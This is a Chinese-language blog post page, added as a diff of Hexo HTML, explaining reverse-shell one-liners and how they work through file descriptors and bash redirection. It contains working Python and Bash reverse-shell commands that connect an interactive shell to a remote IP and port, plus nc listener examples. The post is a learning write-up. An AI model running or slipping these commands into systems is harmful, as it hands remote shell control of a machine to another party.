@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="python,shell," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta name="keywords" content="python,shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话 Shell">
+<meta property="og:url" content="https://co5mos.github.io/2019/10/17/python-shell/index.html">
+<meta property="og:site_name" content="犰狳不求余">
+<meta property="og:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/1.jpeg">
+<meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/2.jpeg">
+<meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/3.jpeg">
+<meta property="og:updated_time" content="2019-10-17T14:11:40.914Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一句话 Shell">
+<meta name="twitter:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta name="twitter:image" content="https://co5mos.github.io/2019/10/17/python-shell/1.jpeg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://co5mos.github.io/2019/10/17/python-shell/"/>
+
+
+
+
+
+  <title>一句话 Shell | 犰狳不求余</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">犰狳不求余</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://co5mos.github.io/2019/10/17/python-shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cosmos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="犰狳不求余">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一句话 Shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-17T20:18:20+08:00">
+                2019-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/编程之道/" itemprop="url" rel="index">
+                    <span itemprop="name">编程之道</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。</p>
+</blockquote>
+<h2 id="Python-一句话反弹-Shell"><a href="#Python-一句话反弹-Shell" class="headerlink" title="Python 一句话反弹 Shell"></a>Python 一句话反弹 Shell</h2><p>今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。</p>
+<a id="more"></a>
+<p>反弹shell脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.30.169',9999));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call(['/bin/bash','-i'])"</span></span><br></pre></td></tr></table></figure>
+<p>展开看一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.30.169"</span>, <span class="number">9999</span>))</span><br><span class="line">[os.dup2(s.fileno(), i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">subprocess.call([<span class="string">'/bin/bash'</span>, <span class="string">'-i'</span>])</span><br></pre></td></tr></table></figure>
+<h3 id="解释一下两个方法"><a href="#解释一下两个方法" class="headerlink" title="解释一下两个方法"></a>解释一下两个方法</h3><h4 id="os-dup2"><a href="#os-dup2" class="headerlink" title="os.dup2()"></a>os.dup2()</h4><p>os.dup2() 方法用于将一个文件描述符 fd1 复制到另一个 fd2。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.dup2(fd1, fd2);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fd1 – 要被复制的文件描述符</li>
+<li>fd2 – 复制的文件描述符</li>
+</ul>
+<p>dup2()传入两个文件描述符，fd1和fd2（fd1是必须存在的），如果fd2存在，就关闭fd2，然后将fd1代表的那个文件（可以想象成是P_fd1指针）强行复制给fd2，fd2这个文件描述符不会发生变化，但是fd2指向的文件就变成了fd1指向的文件。</p>
+<p>类似于重定向</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">os.dup2(f.fileno(), <span class="number">1</span>) <span class="comment"># 将这个文件描述符代表的文件，传递给1描述符指向的文件（也就是stdout）</span></span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># print输出到标准输出流，就是文件描述符1</span></span><br><span class="line">print(<span class="string">'line1'</span>)</span><br><span class="line">print(<span class="string">'line2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本执行结果：</span></span><br><span class="line"><span class="comment"># 生成一个txt文件，内容是：</span></span><br><span class="line"><span class="comment"># line1</span></span><br><span class="line"><span class="comment"># line2</span></span><br></pre></td></tr></table></figure>
+<h4 id="socket-fileno"><a href="#socket-fileno" class="headerlink" title="socket.fileno()"></a>socket.fileno()</h4><p>返回调用该方法的 socket 对象的 fd，fd 可以用于 select() 等机制。在Linux中一切皆文件，套接字也不例外，每个套接字都有自己的文件描述符，调用 fileno() 可以查看对应 socket 对象的描述符。</p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
+<p>维基百科:文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。</p>
+</blockquote>
+<p>标准文件描述符:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件描述符</th>
+<th style="text-align:center">用途</th>
+<th style="text-align:center">POSIX 名称</th>
+<th style="text-align:center">stdio流</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">标准输入</td>
+<td style="text-align:center">STDIN_FILENO</td>
+<td style="text-align:center">stdin</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">标准输出</td>
+<td style="text-align:center">STDOUT_FILENO</td>
+<td style="text-align:center">stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">标准错误</td>
+<td style="text-align:center">STDERR_FILENO</td>
+<td style="text-align:center">stderr</td>
+</tr>
+</tbody>
+</table>
+<p><a href="https://segmentfault.com/a/1190000009724931" target="_blank" rel="noopener">文件描述符参考</a></p>
+<h2 id="Bash-反弹-shell"><a href="#Bash-反弹-shell" class="headerlink" title="Bash 反弹 shell"></a>Bash 反弹 shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>解释一下命令</p>
+<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><p>-i 这个参数表示的是产生交互式的shell</p>
+<h3 id="dev-tcp-ip-port"><a href="#dev-tcp-ip-port" class="headerlink" title="/dev/tcp/ip/port"></a>/dev/tcp/ip/port</h3><p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件）,如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
+<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><ul>
+<li>格式： [n]&lt; word （注意[n]与&lt;之间没有空格）</li>
+<li>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</li>
+</ul>
+<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><ul>
+<li>格式： [n]&gt; word</li>
+<li>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</li>
+</ul>
+<h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h3><ul>
+<li>格式： &amp;&gt; word &gt;&amp; word</li>
+<li>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</li>
+</ul>
+<h3 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h3><ul>
+<li>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] (这里所有字符之间不要有空格)</li>
+<li>说明:<ul>
+<li>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</li>
+<li>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</li>
+</ul>
+</li>
+</ul>
+<h3 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h3><ul>
+<li>格式：exec [n] &lt;/&gt; file/[n]</li>
+<li>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</li>
+</ul>
+<h3 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h3><p>nc 监听</p>
+<p><img src="/2019/10/17/python-shell/1.jpeg" alt="nc 监听"></p>
+<p>建立socket发送数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> xxx &gt; /dev/tcp/192.168.0.105/1212</span><br></pre></td></tr></table></figure>
+<h3 id="再举个🌰"><a href="#再举个🌰" class="headerlink" title="再举个🌰"></a>再举个🌰</h3><p>还是 nc 监听</p>
+<p><img src="/2019/10/17/python-shell/2.jpeg" alt="还是 nc 监听"></p>
+<p>接收数据</p>
+<p><img src="/2019/10/17/python-shell/3.jpeg" alt=""></p>
+<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">参考</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"> <i class="fa fa-tag"></i> python</a>
+          
+            <a href="/tags/shell/" rel="tag"> <i class="fa fa-tag"></i> shell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/07/sqlmapapi/" rel="next" title="Sqlmap API 总结">
+                <i class="fa fa-chevron-left"></i> Sqlmap API 总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Cosmos</p>
+              <p class="site-description motion-element" itemprop="description">Friday is my fave 'F' word!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-一句话反弹-Shell"><span class="nav-number">1.</span> <span class="nav-text">Python 一句话反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解释一下两个方法"><span class="nav-number">1.1.</span> <span class="nav-text">解释一下两个方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os-dup2"><span class="nav-number">1.1.1.</span> <span class="nav-text">os.dup2()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#socket-fileno"><span class="nav-number">1.1.2.</span> <span class="nav-text">socket.fileno()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件描述符"><span class="nav-number">1.2.</span> <span class="nav-text">文件描述符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bash-反弹-shell"><span class="nav-number">2.</span> <span class="nav-text">Bash 反弹 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-number">2.1.</span> <span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-ip-port"><span class="nav-number">2.2.</span> <span class="nav-text">/dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输入重定向"><span class="nav-number">2.3.</span> <span class="nav-text">输入重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输出重定向"><span class="nav-number">2.4.</span> <span class="nav-text">输出重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#标准输出与标准错误输出重定向"><span class="nav-number">2.5.</span> <span class="nav-text">标准输出与标准错误输出重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件描述符的复制"><span class="nav-number">2.6.</span> <span class="nav-text">文件描述符的复制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec-绑定重定向"><span class="nav-number">2.7.</span> <span class="nav-text">exec 绑定重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#举个🌰"><span class="nav-number">2.8.</span> <span class="nav-text">举个🌰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再举个🌰"><span class="nav-number">2.9.</span> <span class="nav-text">再举个🌰</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cosmos</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
